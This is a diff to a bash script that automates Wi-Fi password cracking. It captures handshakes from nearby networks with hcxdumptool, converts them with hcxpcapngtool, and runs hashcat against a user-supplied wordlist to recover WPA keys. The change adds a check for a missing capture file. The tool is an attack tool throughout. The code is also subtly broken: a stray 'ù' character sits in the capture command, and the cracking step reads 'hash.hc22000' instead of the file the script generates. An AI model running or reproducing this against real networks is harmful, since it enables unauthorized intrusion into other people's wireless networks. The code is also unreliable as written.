@@ -110,42 +110,46 @@ box "${YELLOW}[-] ${GREEN} Let's dump of the wifi networks. Press ${YELLOW}CTRL-
 now=$(date +"%Y-%m-%d")
 hcxdumptool -i $INTERFACE ù -o $now.pcapng --active_beacon --enable_status=15
 
-echo
-box "${YELLOW}[-] ${GREEN} Let's decypt the captured pcap file"
-hcxpcapngtool -o $now.hc22000 -E essidlist$now $now.pcapng
-
-if [ -f $now.hc22000 ]; then
+if [ -f $now.pcapng ]; then
 	echo
-	box "${YELLOW}[-] ${GREEN} Enter the absolute path of the wordlist:"
-	read -r -p "${ITALIC_BLUE}--> ${NC}" WORDLISTPATH
+	box "${YELLOW}[-] ${GREEN} Let's decypt the captured pcap file"
+	hcxpcapngtool -o $now.hc22000 -E essidlist$now $now.pcapng
 
-	echo
-	while true; do #You sure while (y/n)
-		echo "${ITALIC_BLUE}# The entered path is: ${RED} $WORDLISTPATH" 
-		ls -lha $WORDLISTPATH
-		read -r -p "${ITALIC_BLUE}# Are you sure? [y/N] ${NC}" response_path 
-		case "$response_path" in 
-			[yY]) #Sure
-			break 
-			;; 
-			[nN]) #Not sure
-				echo
-				echo "${ITALIC_BLUE}# Retype the wordlist path: ${NC}" 
-				echo
-				read -r -p "${ITALIC_BLUE}--> ${NC}" WORDLISTPATH
-			;;
-			* ) #Default
-				echo "${RED}! Please type only Yy or Nn${NC}" 
-	 			echo 
-			;;
-		esac 
-	done #End sure while (y/n)
-		
-	box "${YELLOW}[-] ${GREEN} Crack the captured hc22000 handshake"
-	hashcat -m 22000 hash.hc22000 $WORDLISTPATH 
-	echo
+	if [ -f $now.hc22000 ]; then
+		echo
+		box "${YELLOW}[-] ${GREEN} Enter the absolute path of the wordlist:"
+		read -r -p "${ITALIC_BLUE}--> ${NC}" WORDLISTPATH
 
-	box "${YELLOW}[-] ${GREEN} DONE!"
+		echo
+		while true; do #You sure while (y/n)
+			echo "${ITALIC_BLUE}# The entered path is: ${RED} $WORDLISTPATH" 
+			ls -lha $WORDLISTPATH
+			read -r -p "${ITALIC_BLUE}# Are you sure? [y/N] ${NC}" response_path 
+			case "$response_path" in 
+				[yY]) #Sure
+				break 
+				;; 
+				[nN]) #Not sure
+					echo
+					echo "${ITALIC_BLUE}# Retype the wordlist path: ${NC}" 
+					echo
+					read -r -p "${ITALIC_BLUE}--> ${NC}" WORDLISTPATH
+				;;
+				* ) #Default
+					echo "${RED}! Please type only Yy or Nn${NC}" 
+		 			echo 
+				;;
+			esac 
+		done #End sure while (y/n)
+			
+		box "${YELLOW}[-] ${GREEN} Crack the captured hc22000 handshake"
+		hashcat -m 22000 hash.hc22000 $WORDLISTPATH 
+		echo
+
+		box "${YELLOW}[-] ${GREEN} DONE!"
+	else
+		box "${YELLOW}[-] ${GREEN} No hashes found! Please restart the script"
+	fi
 else
-	box "${YELLOW}[-] ${GREEN} No hashes found! Please restart the script"
+	box "${YELLOW}[-] ${GREEN} No pcap file created for an ${RED}interface error${GREEN}. Please restart"
 fi
